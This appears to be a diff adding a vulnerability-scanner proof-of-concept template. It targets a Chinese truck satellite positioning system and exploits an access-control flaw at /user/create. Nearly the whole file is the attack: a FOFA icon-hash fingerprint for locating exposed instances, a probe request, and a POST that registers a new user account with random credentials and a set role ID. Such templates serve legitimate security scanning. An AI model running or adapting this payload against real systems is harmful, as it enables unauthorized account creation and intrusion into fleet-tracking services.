@@ -1,0 +1,23 @@
+id: poc-yaml-tsps-create-anyuser-create
+info:
+  name: 卡车卫星定位系统 create 任意用户创建漏洞
+  severity: high
+  tags:
+  - 访问控制错误
+  finger: 卡车卫星定位系统
+  fofa: icon_hash="1553867732"
+variables:
+  t1: random_str(5)
+  t2: random_str(6)
+requests:
+- method: GET
+  path: /user/create
+  expression: status_code == 200 && contains(body,"\"code\":201") && !contains(body,"false")
+- method: POST
+  path: /user/create
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: account={{.t1}}&id=&password={{.t2}}&passwordRepeat={{.t2}}&groupName=111&roleid=5&validend=&phone=&email=&chncount=36&flowType=1&oldFlowType=&flowVal=&flowAlarmVal=&oldFlowAlarmVal=&logContent=111&guid=222&token=
+  expression: status_code == 200 && contains(body,"\"code\":200") && contains(body,"\"result\":true}")
+    && contains(content_type,"application/json")
+transport: http
